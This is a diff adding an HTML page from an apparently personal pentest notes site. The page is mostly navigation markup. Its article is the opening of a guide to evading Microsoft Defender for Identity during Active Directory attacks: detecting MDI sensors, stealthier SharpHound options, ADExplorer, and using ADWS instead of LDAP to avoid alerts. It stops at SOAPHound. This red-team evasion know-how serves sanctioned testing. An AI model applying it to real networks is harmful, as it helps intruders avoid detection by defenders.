+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rbcd-resource-based-constrained-delegation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RBCD (Resource-Based Constrained Delegation)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shadow-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Shadow Credentials
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#logon-script-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Logon Script Abuse
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dcsync-opsec" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DCSync OPSEC
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#forged-tickets-opsec" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Forged Tickets OPSEC
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Forged Tickets OPSEC">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#golden-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Golden Ticket
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#diamond-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Diamond Ticket
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#child-to-forest-trust-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Child-to-Forest Trust Abuse
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Child-to-Forest Trust Abuse">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#golden-ticket-child-to-forest" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Golden Ticket - Child to Forest
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#diamond-ticket-child-to-forest" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Diamond Ticket - Child to Forest
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Conclusion
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#to-do-further-research" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        To Do / Further Research
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Macro%20Office%20%28VBA%29.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Macro Office (VBA)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Phishing.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Phishing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_19" >
+        
+          
+          <label class="md-nav__link" for="__nav_19" id="__nav_19_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Salesforce
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_19_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_19">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Salesforce
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Salesforce/Audit%20d%27architecture.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Audit d'architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Salesforce/Extractions.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Extractions
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Salesforce/Revue%20de%20code%20source.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Revue de code source
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Salesforce/Revue%20de%20configuration.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Revue de configuration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Salesforce/Revue%20des%20acc%C3%A8s.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Revue des accès
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Salesforce/Tests%20d%27intrusion.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tests d'intrusion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_20" >
+        
+          
+          <label class="md-nav__link" for="__nav_20" id="__nav_20_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Shells
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_20_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_20">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Shells
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Shells/Escape%20from%20Restricted%20Shells.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Escape from Restricted Shells
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Shells/Reverse%20Shells.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reverse Shells
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Shells/Upgrade%20to%20Fully%20Interactive%20TTYs.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Upgrade to Fully Interactive TTYs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_21" >
+        
+          
+          <label class="md-nav__link" for="__nav_21" id="__nav_21_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    System
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_21_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_21">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    System
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../System/Certificats.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Certificats
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../System/Kali.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kali
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../System/LVM.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LVM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../System/Linux%20Boot%20repair.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Boot repair
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../System/Setup%20Docker%20Lab.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Setup Docker Lab
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../System/UFW.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    UFW
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../System/Update%20Debian.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Update Debian
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../System/VMware.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    VMware
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../System/Windows%20Setup.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Setup
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../System/Wipe%20un%20disque.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Wipe un disque
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_22" >
+        
+          
+          <label class="md-nav__link" for="__nav_22" id="__nav_22_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_22_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_22">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web/File%20Inclusion.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Inclusion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web/Reconnaissance.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web/Ressources.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ressources
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web/SQL%20Injection.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web/Webshells.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Webshells
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web/XSS%20Injection.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#microsoft-defender-for-identity-opsec-guide" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Microsoft Defender for Identity - OPSEC Guide
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Microsoft Defender for Identity - OPSEC Guide">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#table-of-contents" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Table of Contents
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Overview">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#kerberos-flow-reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kerberos Flow Reference
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#detect-mdi-presence" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detect MDI Presence
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reconnaissance-opsec" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reconnaissance OPSEC
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reconnaissance OPSEC">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bloodhound-ldap-sharphound" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BloodHound - LDAP (SharpHound)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#adexplorer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ADExplorer
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bloodhound-adws" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BloodHound - ADWS
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="BloodHound - ADWS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#soaphound" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SOAPHound
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shadowhound-adm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ShadowHound-ADM
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kerberos-requests-opsec" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kerberos Requests OPSEC
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Kerberos Requests OPSEC">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#as-req" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        AS-REQ
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AS-REQ">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#emulate-a-genuine-as-req" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Emulate a Genuine AS-REQ
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tgs-req" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        TGS-REQ
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="TGS-REQ">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#emulate-a-genuine-tgs-req" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Emulate a Genuine TGS-REQ
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#s4u2self" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        S4U2Self
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="S4U2Self">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#emulate-a-genuine-s4u2self-tgs-req" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Emulate a Genuine S4U2Self TGS-REQ
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#s4u2proxy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        S4U2Proxy
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="S4U2Proxy">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#emulate-a-genuine-s4u2proxy-tgs-req" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Emulate a Genuine S4U2Proxy TGS-REQ
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kerberoasting-opsec" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kerberoasting OPSEC
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Kerberoasting OPSEC">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mdi-detections" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MDI Detections
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opsec-approach" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OPSEC Approach
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#targeted-kerberoasting-genericwrite" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Targeted Kerberoasting (GenericWrite)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#identity-attack-paths" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Identity Attack Paths
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Identity Attack Paths">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#entra-connect-interactive-logon" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Entra Connect Interactive Logon
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rbcd-resource-based-constrained-delegation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RBCD (Resource-Based Constrained Delegation)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shadow-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Shadow Credentials
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#logon-script-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Logon Script Abuse
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dcsync-opsec" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DCSync OPSEC
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#forged-tickets-opsec" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Forged Tickets OPSEC
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Forged Tickets OPSEC">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#golden-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Golden Ticket
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#diamond-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Diamond Ticket
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#child-to-forest-trust-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Child-to-Forest Trust Abuse
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Child-to-Forest Trust Abuse">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#golden-ticket-child-to-forest" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Golden Ticket - Child to Forest
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#diamond-ticket-child-to-forest" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Diamond Ticket - Child to Forest
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Conclusion
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#to-do-further-research" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        To Do / Further Research
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="mdi">MDI</h1>
+<h2 id="microsoft-defender-for-identity-opsec-guide">Microsoft Defender for Identity - OPSEC Guide</h2>
+<blockquote>
+<p><strong>Core principle:</strong> Avoid talking to the DC as long as possible, and make traffic appear genuine by emulating legitimate Kerberos requests.</p>
+</blockquote>
+<hr />
+<h3 id="table-of-contents">Table of Contents</h3>
+<ol>
+<li><a href="#overview">Overview</a></li>
+<li><a href="#reconnaissance-opsec">Reconnaissance OPSEC</a></li>
+<li><a href="#kerberos-requests-opsec">Kerberos Requests OPSEC</a></li>
+<li><a href="#kerberoasting-opsec">Kerberoasting OPSEC</a></li>
+<li><a href="#identity-attack-paths">Identity Attack Paths</a></li>
+<li><a href="#logon-script-abuse">Logon Script Abuse</a></li>
+<li><a href="#dcsync-opsec">DCSync OPSEC</a></li>
+<li><a href="#forged-tickets-opsec">Forged Tickets OPSEC</a></li>
+<li><a href="#conclusion">Conclusion</a></li>
+<li><a href="#to-do--further-research">To Do / Further Research</a></li>
+<li><a href="#references">References</a></li>
+</ol>
+<hr />
+<h3 id="overview">Overview</h3>
+<p>https://learn.microsoft.com/en-us/defender-for-identity/what-is</p>
+<ul>
+<li>MDI sensors are installed on DCs and Federation servers.</li>
+<li>Analysis and alerting is done in the Azure cloud.</li>
+<li>MDI can detect:</li>
+<li><strong>Recon</strong> - LDAP enumeration, BloodHound collection</li>
+<li><strong>Compromised credentials</strong> - Brute-Force, Kerberoasting</li>
+<li><strong>Lateral movement</strong> - PTH, OPTH</li>
+<li><strong>Domain Dominance</strong> - DCSync, Golden Ticket, Skeleton Key</li>
+<li><strong>Exfiltration</strong></li>
+</ul>
+<p><img alt="" src="img/MDIAlerts.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260423104305.png" /></p>
+<h4 id="kerberos-flow-reference">Kerberos Flow Reference</h4>
+<p><strong>AS-REQ (Authentication Service Request)</strong></p>
+<p><img alt="" src="img/ASREQ.png" /></p>
+<p><strong>TGS-REQ (Ticket Granting Service Request)</strong></p>
+<p><img alt="" src="img/TGSREQ.png" /></p>
+<h4 id="detect-mdi-presence">Detect MDI Presence</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Check for MDI sensor API endpoint</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>https://&lt;your-workspace-name&gt;sensorapi.atp.azure.com
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="c1"># Example:</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>https://yhp0wsensorapi.atp.azure.com
+</code></pre></div>
+<hr />
+<h3 id="reconnaissance-opsec">Reconnaissance OPSEC</h3>
+<h4 id="bloodhound-ldap-sharphound">BloodHound - LDAP (SharpHound)</h4>
+<p>To make BloodHound collection stealthy:
+- Remove noisy collection methods: RDP, DCOM, PSRemote, LocalAdmin
+- Use <code>--ExcludeDCs</code> to avoid direct MDI detection</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Detected by MDI</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>SharpHound.exe<span class="w"> </span>--collectionmethods<span class="w"> </span>All
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="c1"># More OPSEC-friendly, but still detected by MDI</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>SharpHound.exe<span class="w"> </span>--collectionmethods<span class="w"> </span>Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets,CertServices<span class="w"> </span>--excludedcs
+</code></pre></div>
+<p><strong>MDI Alerts:</strong></p>
+<p><img alt="" src="img/Pasted%20image%2020260417161913.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260421161950.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260421162024.png" /></p>
+<h4 id="adexplorer">ADExplorer</h4>
+<p>ADExplorer (Microsoft Sysinternals) is a signed tool for AD viewing and editing - a better alternative to LDAP recon.
+- Reference: https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer
+- A user can take a snapshot of AD and process it offline.
+- The snapshot can be converted into BloodHound JSON files: https://github.com/c3c/ADExplorerSnapshot
+- Reference: https://trustedsec.com/blog/adexplorer-on-engagements</p>
+<p><strong>Drawbacks:</strong>
+- May fail in large domains with poor connectivity.
+- When ADFS is deployed, ADExplorer triggers an MDI alert by reading the ADFS LDAP container.</p>
+<p><img alt="" src="img/Pasted%20image%2020260421164605.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260421164615.png" /></p>
+<p><img alt="" src="img/Pasted%20image%2020260421164621.png" /></p>
+<blockquote>
+<p><strong>Prefer ADWS over LDAP when possible</strong> to avoid MDI detection.</p>
+</blockquote>
+<h4 id="bloodhound-adws">BloodHound - ADWS</h4>
+<h5 id="soaphound">SOAPHound</h5>
+<p><a href="https://github.com/FalconForceTeam/SOAPHound">SOAPHound</a> talks to Active Directory Web Services (ADWS - Port 9389) instead of sending LDAP queries.
+- Almost no network-based detection by MDI.
